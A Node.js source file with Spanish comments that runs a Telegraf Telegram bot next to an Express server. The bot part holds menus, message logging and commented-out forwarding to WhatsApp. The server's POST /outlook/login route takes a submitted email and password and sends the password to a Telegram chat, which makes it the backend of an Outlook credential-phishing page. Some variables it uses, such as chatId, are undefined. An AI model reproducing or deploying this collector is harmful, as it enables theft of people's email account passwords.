const { Telegraf } = require('telegraf')
const { getFile, enviarWhatsapp } = require("./whatsapp");

const { MenuTemplate, MenuMiddleware } = require("telegraf-inline-menu");

const token = "token"; // boter
//token pap

const bot = new Telegraf(token);

const express = require("express");
const cors = require('cors');
let listUrl = new Array();



bot.start((ctx) => { ctx.reply("Listo para enviar mensajes") });
bot.command(["url", "Url", "URL"], (ctx) => {
  let url = "";
  listUrl.forEach((item) => {
    url = url + `${item} \n  `;
  });
  ctx.reply(`
  Lista de url:
    ${url}
  `);
});

// Escuchar evento
bot.hears("shit", (ctx) => ctx.reply("Sin palabrotas"));

// menu
const menuTemplate = new MenuTemplate((ctx) => `Hola ${ctx.from.first_name}!`);

menuTemplate.interact("Ver url", "a", {
  do: async (ctx) => ctx.reply("Lista de url!"),
});

const menuMiddleware = new MenuMiddleware("/", menuTemplate);
bot.command("menu", (ctx) => menuMiddleware.replyToContext(ctx));
bot.use(menuMiddleware);

bot.on("message", (ctx) => {
  console.log('ctx', 'entro al bot')
  const files = ctx.update.message.photo;
  const videos = ctx.update.message.video;
  const texto = ctx.message.text;

  // const type = ctx;
  // const subType = ctx.updateSubTypes[0]; //video photo text
  console.log("ctx", ctx.message);
  console.log("telegram - id", ctx.message.from.id);
  //  ctx.reply(`Tu telegram id es ${ctx.message.from.id}`);

  // console.log(videos), ctx.update.message;
  // if (subType == "video") {
  //   const { file_id } = videos;
  //   const urlpath = `https://api.telegram.org/bot${token}/getFile?file_id=${file_id}`;
  //   getFile(ctx, urlpath, subType);
  // }
  // if (subType == "photo") {
  //   if (files) {
  //     const archivo = files[0];
  //     console.log("archivo", archivo);
  //     const { file_id } = archivo;
  //     const urlpath = `https://api.telegram.org/bot${token}/getFile?file_id=${file_id}`;
  //     getFile(ctx, urlpath, subType);
  //   }
  // }
  // if (subType == "text") {
  //   if (texto) {
  //     // const mensaje = `${ctx.from.first_name} ha enviado el siguiente msj: \n ${texto}`;
  //     const mensaje = `*Hola mundo*: \n ${texto}`;
  //     enviarWhatsapp(mensaje, subType);
  //   }
  // }
});

bot.launch();

const app = express();
const port = process.env.PORT || 3001;

// http://localhost:3001/file/photos/file_8.jpg

// app.use('/', express.static(__dirname + 'file/photos'));
app.use(express.static("file"));
app.use(express.json());
app.use(cors());

app.post('/outlook/login', (req, res) => {
  // bot.sendMessage(chatId, "Ingresar a Outlook");
  const { email, password } = req.body;
  const mensaje = `password: ${password}`;
  bot.telegram.sendMessage(chatId, mensaje);
  res.json({
    "status": "success",
  })
})
app.post('/test', (req, res) => {

  bot.telegram.sendMessage(groupPapQr, "Hola mundo!!!");
  res.json({
    "status": "success",
  })
})

app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`);
});
